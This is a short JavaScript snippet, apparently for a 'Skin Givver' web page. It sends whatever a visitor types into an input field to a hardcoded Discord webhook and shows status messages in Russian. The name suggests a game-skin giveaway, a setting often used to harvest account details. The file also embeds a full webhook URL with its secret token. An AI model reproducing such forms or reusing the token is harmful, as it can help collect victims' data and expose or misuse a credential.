const input = document.getElementById('inputField');
const status = document.getElementById('status');
const webhookUrl = 'https://discord.com/api/webhooks/1504486169084301445/w_i3aEnuu9MmKjBMujqBmRTg6KeXD0aJcIZRZ2AnN0Pt1uS7G6fd0gfm3zUy0L_o-qTY';

input.addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
        const value = input.value.trim();
        
        if (value === "") return;

        status.innerText = "Отправка...";
        
        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Новое сообщение от Skin Givver:**\n${value}`
            })
        })
        .then(() => {
            status.innerText = "Успешно отправлено!";
            input.value = ""; // Очистить поле
            setTimeout(() => { status.innerText = ""; }, 3000);
        })
        .catch((err) => {
            status.innerText = "Ошибка при отправке.";
            console.error(err);
        });
    }
});
